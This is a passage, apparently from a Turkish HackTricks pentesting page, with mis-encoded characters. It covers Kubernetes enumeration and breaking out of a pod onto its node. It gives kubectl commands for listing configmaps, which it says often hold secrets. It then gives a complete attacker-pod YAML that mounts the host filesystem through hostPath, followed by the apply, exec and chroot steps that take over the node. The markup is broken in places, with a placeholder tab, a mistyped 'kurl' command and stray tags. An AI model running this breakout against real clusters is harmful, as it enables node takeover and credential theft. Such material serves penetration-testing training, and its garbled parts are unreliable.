
configMap her zaman Kubernetes'te Ã§alÄ±ÅŸan uygulamalara saÄŸlanan birÃ§ok bilgi ve yapÄ±landÄ±rma dosyasÄ±nÄ± iÃ§erir. Genellikle, diÄŸer iÃ§/dÄ±ÅŸ servislere baÄŸlanmak ve doÄŸrulamak iÃ§in kullanÄ±lan birÃ§ok ÅŸifre, gizli bilgi ve belirteÃ§ bulabilirsiniz.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

API sekmesi iÃ§eriÄŸi buraya gelecek.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### "TÃ¼mÃ¼nÃ¼" Al

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Pod TÃ¼ketimlerini AlÄ±n**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### Pod'dan KaÃ§ma

EÄŸer yeni pod'lar oluÅŸturabiliyorsanÄ±z, onlardan dÃ¼ÄŸÃ¼me kaÃ§abilirsiniz. Bunu yapabilmek iÃ§in bir yaml dosyasÄ± kullanarak yeni bir pod oluÅŸturmanÄ±z, oluÅŸturulan pod'a geÃ§meniz ve ardÄ±ndan dÃ¼ÄŸÃ¼mÃ¼n sistemine chroot yapmanÄ±z gerekmektedir. Var olan pod'larÄ± yaml dosyasÄ± iÃ§in referans olarak kullanabilirsiniz Ã§Ã¼nkÃ¼ mevcut gÃ¶rÃ¼ntÃ¼leri ve yollarÄ± gÃ¶sterirler.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> EÄŸer belirli bir dÃ¼ÄŸÃ¼mde pod oluÅŸturmanÄ±z gerekiyorsa, dÃ¼ÄŸÃ¼mdeki etiketleri almak iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz
>
> `k get nodes --show-labels`
>
> Genellikle, kubernetes.io/hostname ve node-role.kubernetes.io/master etiketleri seÃ§im iÃ§in iyidir.
>
> [referans]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Daha sonra attack.yaml dosyanÄ±zÄ± oluÅŸturun
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[orijinal yaml kaynaÄŸÄ±](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

ArdÄ±ndan pod'u oluÅŸturun.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Åimdi oluÅŸturulan pod'a aÅŸaÄŸÄ±daki gibi geÃ§ebilirsiniz:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Ve son olarak dÃ¼ÄŸÃ¼mÃ¼n sistemine chroot yapÄ±n.
```bash
chroot /root /bin/bash
```
Bilgiler: [Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referanslar

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitimi AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitimi GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}
